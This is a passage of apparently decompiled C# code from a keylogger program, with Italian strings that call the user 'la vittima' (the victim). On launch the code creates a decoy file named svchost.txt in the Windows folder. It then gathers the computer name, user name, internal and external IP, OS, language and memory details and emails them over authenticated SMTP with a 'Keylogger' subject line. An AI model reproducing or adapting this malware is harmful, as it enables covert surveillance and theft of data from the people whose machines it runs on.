          goto label_4;
label_3:
        num3 = 3;
        this.Timer4.Enabled = false;
        goto label_14;
label_4:
        num3 = 5;
label_5:
        num3 = 6;
        System.IO.File.Create("C:\\Windows\\svchost.txt");
label_6:
        num3 = 7;
        this.emailer.From = new MailAddress(this.Label3.Text);
label_7:
        num3 = 8;
        this.emailer.To.Add(this.Label3.Text);
label_8:
        num3 = 9;
        this.emailer.Body = "La vittima ha aperto il programma...\r\n\r\n\r\n\r\n\r\n\r\n\r\nNome Computer: " + MyProject.Computer.Name + "\r\nNome Utente: " + MyProject.User.Name + "\r\n\r\nIP Interno: " + this.Label1.Text + "\r\nIP Esterno: " + this.Label2.Text + "\r\n\r\nLingua utente: " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\nSistema Operativo: " + MyProject.Computer.Info.OSFullName + "\r\n\r\nMemoria fisica libera (RAM): " + MyProject.Computer.Info.AvailablePhysicalMemory.ToString() + " byte\r\nMemoria fisica totale (RAM): " + MyProject.Computer.Info.TotalPhysicalMemory.ToString() + " byte\r\nMemoria virtuale libera: " + MyProject.Computer.Info.AvailableVirtualMemory.ToString() + " byte\r\nMemoria virtuale totale: " + MyProject.Computer.Info.TotalVirtualMemory.ToString() + " byte\r\n";
label_9:
        num3 = 10;
        this.emailer.Subject = "Apertura Keylogger -    " + this.Label1.Text + " / " + this.Label2.Text;
label_10:
        num3 = 11;
        this.smtp.Port = 587;
label_11:
        num3 = 12;
        this.smtp.EnableSsl = true;
label_12:
        num3 = 13;
        this.smtp.Credentials = (ICredentialsByHost) new NetworkCredential(this.Label3.Text, this.Label4.Text);
label_13:
        num3 = 14;
        this.smtp.Send(this.emailer);
label_14:
label_15:
        num3 = 16;
        this.Timer4.Enabled = false;
        goto label_22;
label_17:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
              case 15:
                goto label_14;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 16:
                goto label_15;
              case 17:
                goto label_22;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_17;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_22:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
    }
  }
}
